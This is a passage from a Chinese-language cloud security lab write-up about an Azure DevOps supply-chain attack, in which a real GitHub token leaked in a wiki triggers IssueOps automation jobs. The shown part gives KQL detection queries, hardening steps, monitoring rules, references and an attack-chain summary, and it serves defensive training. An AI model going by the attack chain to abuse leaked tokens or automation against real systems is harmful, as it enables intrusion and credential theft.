// Azure Storage Analytics
AzureDiagnostics
| where Category == "StorageRead"
| where ObjectKey contains "refiningwiki"
| summarize Count = count(), IPs = make_set(CallerIpAddress) by bin(TimeGenerated, 1h)
| where Count > 100  // 异常高频访问
```

#### 3. 自动化 Job 异常创建检测

**检测逻辑**: 监控 Azure Automation Job 的异常模式

```kusto
// Azure Activity Logs
AzureActivity
| where OperationNameValue == "Microsoft.Automation/automationAccounts/jobs/write"
| where ActivityStatus == "Succeeded"
| extend Caller = tostring(Caller)
| extend JobId = tostring(Properties_JobId)
| project TimeGenerated, Caller, JobId, OperationNameValue
| order by TimeGenerated desc
```

#### 4. IssueOps 关键字监控

**检测逻辑**: 监控包含自动化关键字的 Issue

```kusto
// 需要集成 GitHub Webhook 日志
GitHubWebhookLogs
| where action == "created"
| where issue_body contains "createawsvmuser"
| project TimeGenerated, sender, repository, issue_title, issue_body
| where sender != "expected-bot-user"  // 非预期创建者
```

### 防御措施

#### 1. 消除硬编码凭据

**问题**: Wiki 文档中包含真实的 GitHub PAT

**解决方案**:

| 方法 | 说明 | 优先级 |
|------|------|--------|
| **使用密钥管理服务** | 将凭据存储在 Azure Key Vault | 高 |
| **Azure Managed Identity** | 使用托管标识替代 PAT | 高 |
| **环境变量** | 使用环境变量传递凭据 | 中 |
| **文档审查** | 建立文档审查流程 | 中 |

**实施示例**:

```powershell
# 错误做法（硬编码）
$pat = "github_pat_11AKI..."

# 正确做法（从 Key Vault 获取）
$pat = (Get-AzKeyVaultSecret -VaultName "MyKeyVault" -Name "GitHubPat").SecretValue
```

#### 2. 保护静态网站

**问题**: Azure Static Website 未配置访问控制

**解决方案**:

```json
// Azure Storage 静态网站安全配置
{
  "staticWebsite": {
    "enabled": true,
    "indexDocument": "index.html",
    "errorDocument404Path": "404.html"
  },
  "networkAcls": {
    "defaultAction": "Deny",
    "bypass": "AzureServices",
    "ipRules": [
      {
        "value": "203.0.113.0/24",
        "action": "Allow"
      }
    ],
    "virtualNetworkRules": [
      {
        "id": "/subscriptions/.../virtualNetworks/.../subnets/...",
        "action": "Allow"
      }
    ]
  }
}
```

**替代方案**:
- 使用 Azure Front Door + Azure AD 集成
- 使用 Azure Static Web Apps（内置身份验证）

#### 3. 改进 IssueOps 安全性

**问题**: 自动化系统未验证 Issue 创建者身份

**解决方案**:

```yaml
# 安全的 IssueOps 实现示例
automation:
  on_issue:
    # 验证创建者
    if:
      - issue.author in allowed_users
      - issue.author.type == "User"  # 排除 Bot
    # 验证关键字
    if:
      - issue.body contains "createawsvmuser"
    # 验证标签
    if:
      - issue.labels contains "automation-approved"
    then:
      - create_automation_job
    else:
      - post_comment("Unauthorized: Access denied")
```

**关键控制**:
1. **白名单验证**: 只允许特定用户创建自动化 Issue
2. **标签要求**: 要求 Issue 包含审批标签
3. **多因素验证**: 要求多个条件同时满足

#### 4. 最小权限原则

**问题**: GitHub PAT 权限过大

**解决方案**:

```powershell
# 创建最小权限的 GitHub PAT
$scopes = @(
    "public_repo"  # 仅访问公共仓库
    # 或者
    "repo:status"  # 仅读写状态
)

# 对于本场景，最小权限配置：
$requiredScopes = @{
    "repo" = @{
        "status" = "write"  # 只需要写状态
    }
}
```

**权限审查检查清单**:
- [ ] PAT 是否设置了过期时间？
- [ ] PAT 是否限制了作用域？
- [ ] PAT 是否记录了使用用途？
- [ ] PAT 是否定期轮换？

#### 5. 监控与告警

**基于项目的 AadSecConfig.json**:

```json
{
  "controls": {
    "devOps": {
      "github_pat_monitoring": {
        "enabled": true,
        "alertOn": [
          "PAT used from unexpected IP",
          "PAT used outside business hours",
          "High frequency of API calls"
        ]
      },
      "wiki_access_monitoring": {
        "enabled": true,
        "alertOn": [
          "Anonymous access to static website",
          "Access from non-corporate IP"
        ]
      },
      "automation_job_monitoring": {
        "enabled": true,
        "alertOn": [
          "Job created by non-authorized user",
          "Job contains sensitive data in output"
        ]
      }
    }
  }
}
```

---

## 参考资料

### 项目内文档

| 文档 | 位置 | 相关内容 |
|------|------|----------|
| 服务主体攻击 | [ServicePrincipals-ADO.md](ServicePrincipals-ADO.md) | Azure DevOps 中的凭据管理 |
| 身份安全监控 | [IdentitySecurityMonitoring.md](IdentitySecurityMonitoring.md) | 身份安全监控框架 |
| 横向移动防护 | [LateralMovementADEID.md](LateralMovementADEID.md) | AD 攻陷后的防护 |
| AiTM 攻击 | [Adversary-in-the-Middle.md](Adversary-in-the-Middle.md) | 中间人攻击技术 |

### 检测规则文件

| 规则文件 | 位置 | 用途 |
|----------|------|------|
| AADConnectorAccount 监控 | [queries/AADConnectorAccount-*.kql](queries/) | 服务主体异常活动检测 |
| AiTM 活动狩猎 | [queries/AiTM/HuntUserActivities.kql](queries/AiTM/) | 用户活动模式分析 |
| MDA 多阶段事件 | [queries/MDA-Hunt-Multi-Stage-Incident.kql](queries/) | 多阶段攻击关联 |

### 配置文件

| 文件 | 位置 | 用途 |
|------|------|------|
| 安全配置基线 | [config/AadSecConfig.json](config/AadSecConfig.json) | Entra ID 安全配置参考 |
| 权限授予策略 | [config/permissionGrantPolicies.json](config/permissionGrantPolicies.json) | OAuth 权限管理 |
| EIDSCA 部署模板 | [config/deploy/AADSCA-Playbook.arm.json](config/deploy/) | 安全配置分析器 |

### MITRE ATT&CK 映射

项目的 [media/mitre/AttackScenarios/](media/mitre/AttackScenarios/) 目录包含详细的攻击场景映射：

- [Attacks_Combined.json](media/mitre/AttackScenarios/Attacks_Combined.json) - 所有攻击场景综合映射
- [Attacks_Combined.svg](media/mitre/AttackScenarios/Attacks_Combined.svg) - 可视化攻击图谱
- [ADO.json](media/mitre/AttackScenarios/ADO.json) - Azure DevOps 攻击场景

### 外部参考资料

#### 官方文档

| 主题 | 链接 |
|------|------|
| GitHub REST API - Issues | [GitHub REST API docs for Issues](https://docs.github.com/en/rest/issues/issues?apiVersion=2022-11-28#create-an-issue) |
| Personal Access Tokens | [Managing your personal access tokens](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens) |
| Azure Static Website | [Hosting static websites in Azure Storage](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blob-static-website) |
| Azure Automation | [Azure Automation documentation](https://learn.microsoft.com/en-us/azure/automation/) |

#### 安全研究

| 主题 | 来源 |
|------|------|
| 硬编码凭据风险 | [OWASP Top 10 - A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) |
| DevOps 安全 | [Secure DevOps - Cloud Adoption Framework](https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/secure/best-practices/secure-devops) |
| ChatOps 安全 | [ChatOps Security Best Practices](https://www.reddit.com/r/DevOps/wiki/security/) |
| 供应链攻击 | [Software Supply Chain Attacks](https://www.cisa.gov/news-events/news/understanding-and-software-supply-chain-attacks) |

#### 工具和实用程序

| 工具 | 用途 | 链接 |
|------|------|------|
| TruffleHog | 凭据扫描 | [GitHub - trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog) |
| Gitleaks | Git 仓库密钥检测 | [GitHub - gitleaks](https://github.com/gitleaks/gitleaks) |
| GitGuardian | Git 凭据监控 | [GitGuardian](https://www.gitguardian.com/) |
| AAD Internals | Azure AD 安全测试 | [GitHub - AADInternals](https://github.com/Gerenios/AADInternals) |

### 实验相关文件位置

| 文件类型 | 位置 | 说明 |
|----------|------|------|
| 攻击结果 | `C:\AzAD\Tools\Objective10_Result.json` | 本实验生成的结果文件 |
| 工具脚本 | `C:\AzAD\Tools\` | 实验工具目录 |
| 检测查询 | `queries/` | KQL 检测查询 |
| 规则模板 | `config/ruletemplates/` | Sentinel 规则模板 |

---

## 总结

### 攻击链回顾

本实验展示了一个完整的 DevOps 供应链攻击场景：

```
侦察 → 凭据收集 → 逻辑探测 → 命令注入 → 结果提取
```

### 关键安全教训

1. **硬编码凭据是致命漏洞**: Wiki 文档中的"示例"Token 是真实的，直接导致系统被入侵
2. **错误信息泄露危害大**: 详细的验证错误帮助攻击者理解系统逻辑
3. **自动化系统需要严格验证**: IssueOps/ChatOps 系统必须验证请求来源和创建者身份
4. **最小权限原则至关重要**: GitHub PAT 应只授予必要的权限
5. **配置错误的危险**: 未受保护的静态网站暴露了敏感信息

### 防御优先级

| 优先级 | 措施 | 影响 | 实施难度 |
|--------|------|------|----------|
| **关键** | 移除所有硬编码凭据 | 阻止初始访问 | 低 |
| **高** | 保护静态网站访问 | 防止信息泄露 | 中 |
| **高** | 实施 IssueOps 白名单 | 防止自动化滥用 | 中 |
| **中** | 限制 PAT 权限范围 | 减少攻击影响 | 低 |
| **中** | 启用详细监控日志 | 提高检测能力 | 中 |
| **低** | 定期安全培训 | 提高安全意识 | 高 |

### 下一步学习

完成本实验后，继续学习：
- **Objective 11**: 利用 Job ID 提取 Azure Automation 凭据
- **供应链安全**: 深入了解 DevOps 安全最佳实践
- **密钥管理**: 学习 Azure Key Vault 的正确使用方法

---

> **文档版本历史**
> - v2.0 (2025): 基于项目资料全面优化，增加理论基础、检测防御和参考资料
> - v1.0 (初始版): 基于实验手册的基础步骤总结
